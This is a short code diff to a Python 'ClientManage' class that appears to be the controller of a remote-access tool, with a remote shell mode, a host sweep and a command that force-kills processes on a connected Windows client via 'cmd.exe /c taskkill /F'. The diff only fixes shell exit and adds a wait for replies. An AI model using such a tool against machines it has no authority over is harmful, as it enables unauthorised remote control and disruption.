@@ -264,6 +264,7 @@ class ClientManage:
                             if (sh == "exit"):
                                 shell = False
                                 shellmode = False
+                                break
                             
 
                 elif(main == "exit"):
@@ -565,8 +566,9 @@ Open Ports
                     processname = input("[?] Enter Process name : ")
                     if(len(processname) > 0):
                         
-                        self.SendData("cmd.exe /c taskkill /IM " + processname)
-
+                        self.SendData("cmd.exe /c taskkill /IM " + processname + " /F")
+                        self.WaitForReply()
+                        
                 elif(main == "host_sweep"):
                     try:
                         if((len(self.remote_hosts_list)) > 0):
